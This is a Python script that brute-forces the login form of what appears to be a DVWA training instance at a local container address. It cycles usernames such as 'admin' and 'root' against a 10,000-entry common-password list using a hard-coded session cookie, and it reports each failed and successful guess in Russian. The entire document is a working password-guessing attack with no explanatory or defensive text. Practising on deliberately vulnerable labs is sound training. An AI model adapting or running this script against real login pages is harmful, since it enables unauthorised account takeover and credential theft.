import requests

usernames = ['admin','administrarot','user','root','Admin','Administrator']
with open('10-million-password-list-top-10000.txt', "r") as f:
    passwords = f.readlines()
cookies_ = {'PHPSESSID': 'deu867jli8go3kps5qubne0hm3','security':'low'}
passwords = [password.strip() for password in passwords]
fl = 1
for username in usernames:
    if fl:
        for password in passwords:
            # Параметры запроса
            url = f'http://172.17.0.2/vulnerabilities/brute/?username={username}&password={password}&Login=Login#'

            response = requests.get(url,cookies=cookies_)
            if 'Welcome to the password protected area' in str(response.text):
                print(f"Пароль найден: {password},username:{username}")
                fl = 0
                break
            else:
                print(f"Пароль неверный: username:{username}, password: {password}")
    else:
        break
